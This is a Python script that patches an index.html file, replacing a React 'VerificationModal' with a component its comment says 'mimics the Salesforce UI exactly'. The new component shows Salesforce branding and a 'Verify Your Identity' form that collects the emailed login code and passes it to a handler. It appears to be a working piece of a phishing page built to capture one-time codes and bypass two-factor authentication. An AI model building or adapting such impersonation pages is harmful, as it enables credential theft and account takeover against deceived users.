import os

file_path = "index.html"

# The NEW modal content that mimics the Salesforce UI exactly
new_modal_code = r"""        const VerificationModal = ({ email, onVerify, onClose }) => {
            const [code, setCode] = React.useState('');

            return (
                <div className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center animate-fade-in font-sans">
                     <div className="w-full max-w-[400px] px-6">
                        <div className="flex justify-center mb-6">
                            <span className="text-[#00A1E0] text-6xl">
                                <i className="fa-brands fa-salesforce"></i>
                            </span>
                        </div>
                        
                        <h2 className="text-2xl text-[#181818] font-light mb-4 text-center">Verify Your Identity</h2>
                        
                        <div className="bg-white">
                            <p className="text-[#181818] text-[15px] mb-4 leading-relaxed">
                                You're trying to log in to Salesforce. To make sure your Salesforce account is secure, we have to verify your identity.
                            </p>
                            
                            <p className="text-[#181818] text-[15px] mb-6 leading-relaxed">
                                Enter the verification code we emailed to <strong>{email || 'user@company.com'}</strong>.
                            </p>

                            <div className="mb-6">
                                <label className="block text-[#3E3E3C] text-[13px] font-normal mb-1">Verification Code</label>
                                <input
                                    type="text"
                                    className="w-full px-3 py-2 bg-white border border-[#747474] rounded-[4px] focus:ring-1 focus:ring-[#0176d3] focus:border-[#0176d3] focus:outline-none transition-shadow text-[15px]"
                                    value={code}
                                    onChange={e => setCode(e.target.value)}
                                    autoFocus
                                />
                            </div>

                            <button
                                onClick={() => onVerify(code)}
                                disabled={!code}
                                className="w-full py-[9px] bg-[#0176D3] hover:bg-[#015ba6] text-white rounded-[4px] font-normal text-[15px] transition-colors mb-4"
                            >
                                Verify
                            </button>
                            
                            <div className="flex items-center mb-6">
                                <input type="checkbox" id="dont_ask" className="mr-2 rounded-sm border-gray-300 text-[#0176D3] focus:ring-[#0176D3]" />
                                <label htmlFor="dont_ask" className="text-[13px] text-[#181818]">Don't ask again</label>
                            </div>
                            
                            <div className="text-center">
                                <button onClick={onClose} className="text-[#0176D3] text-[13px] hover:underline">
                                    Resend Code
                                </button>
                            </div>
                        </div>
                     </div>
                </div>
            );
        };"""

with open(file_path, "r", encoding="utf-8") as f:
    content = f.read()

# We need to find the OLD VerificationModal and replace it.
# Strategy: Find "const VerificationModal = " and the matching closing "};" before "const App ="

start_marker = "const VerificationModal = ({ email, onVerify, onClose }) => {"
end_marker = "const App = () => {"

start_idx = content.find(start_marker)
end_idx = content.find(end_marker)

if start_idx != -1 and end_idx != -1:
    # We want to replace everything from start_marker up to (but not including) end_marker.
    # We need to look backward from end_marker to find the closing brace of the previous component/block
    # But simply, we can replace from start_idx to end_idx ONLY IF we are sure there is nothing else in between.
    # Looking at the file content, VerificationModal is immediately before App.
    # So we replace [start_idx : end_idx] with new_modal_code + "\n\n        "
    
    new_content = content[:start_idx] + new_modal_code + "\n\n        " + content[end_idx:]
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(new_content)
    print("SUCCESS")
else:
    print("MARKERS NOT FOUND")
